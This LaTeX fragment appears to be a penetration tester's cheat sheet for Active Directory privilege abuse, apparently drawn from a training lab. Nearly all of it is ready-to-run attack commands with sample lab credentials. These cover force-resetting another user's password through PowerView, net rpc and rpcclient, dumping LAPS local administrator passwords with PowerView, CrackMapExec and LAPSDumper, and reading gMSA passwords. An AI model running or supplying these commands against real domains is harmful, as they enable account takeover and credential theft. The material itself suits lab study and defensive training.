\section{Change a user password}

{\bf prerequisit}: \verb+GenericAll+, \verb+AllExtendedRights+, or \verb+User-Force-Change-Password+

\subsection{On windows}
with powerview~\ref{tool:powerview:Set-DomainUserPasswword} or AD module 

\begin{verbatim}
Set-DomainUserPassword -Identity yolanda -AccountPassword $((ConvertTo-SecureString 'NewpasswordfromW1' -AsPlainText -Force)) -Verbose

Import-Module ActiveDirectory
Set-ADAccountPassword yolanda -NewPassword $((ConvertTo-SecureString 'NewpasswordfromW2' -AsPlainText -Force)) -Reset -Verbose

\end{verbatim}


\subsection{Linux} 
\begin{itemize}
    \item 
        \verb+pth-net+ from \href{https://github.com/byt3bl33d3r/pth-toolkit}{pth-toolkit}
    \item 
        linux \verb+net+ command
    \item 
        \verb+rpcclient+

\end{itemize}

\begin{verbatim}
net rpc password yolanda Mynewpassword1 -U inlanefreight.local/pedro%SecuringAD01 -S 10.129.205.81

rpcclient -U INLANEFREIGHT/pedro%SecuringAD01 10.129.205.81
rpcclient $> setuserinfo2 yolanda 23 Mynewpassword2
rpcclient $> exit
\end{verbatim}


\section{Read LAPS password}

allow to connect as administrator

\subsection{Windows}
\verb+Powerview+:
\begin{verbatim}
Import-Module .\PowerView.ps1
Get-DomainObject -Identity LAPS09 -Properties "ms-mcs-AdmPwd",name


Get-DomainComputer -Properties name | ForEach-Object {
    $computer = $_.name
    $obj = Get-DomainObject -Identity $computer -Properties "ms-mcs-AdmPwd",name -ErrorAction SilentlyContinue
    if($obj.'ms-mcs-AdmPwd'){
        Write-Output "$computer`: $($obj.'ms-mcs-AdmPwd')"
    }
}
\end{verbatim}

AD module:
\begin{verbatim}
Import-Module ActiveDirectory
Get-ADComputer -Identity LAPS09 -Properties "ms-mcs-AdmPwd",name
\end{verbatim}

\subsection{Linux}

\begin{verbatim}
cme smb 10.129.18.161 -u yolanda -p toto  --laps LAPS07
\end{verbatim}


\href{https://github.com/n00py/LAPSDumper}{LAPSDumper}:
add domain to \verb+/etc/hosts+
\begin{verbatim}
python3 laps.py -u rita -p Password123 -l 10.129.205.81 -d inlanefreight.local
\end{verbatim}



\section{Read GMSA Password}

\subsection{Windows}
\href{https://github.com/rvazarkar/GMSAPasswordReader}{GMSAPasswordReader}
\begin{verbatim}
GMSAPasswordReader.exe --accountname apache-dev
\end{verbatim}

the pth

\subsection{Linux}
\begin{verbatim}
crackmapexec ldap <ip> -u <user> -p <pass> --gmsa
\end{verbatim}

\href{https://github.com/micahvandeusen/gMSADumper}{gMSADumper}

add domain to \verb+/etc/hosts+
\begin{verbatim}
python gMSADumper.py -u marcos -p toto -d domain.local -l 10.18.205.81
\end{verbatim}



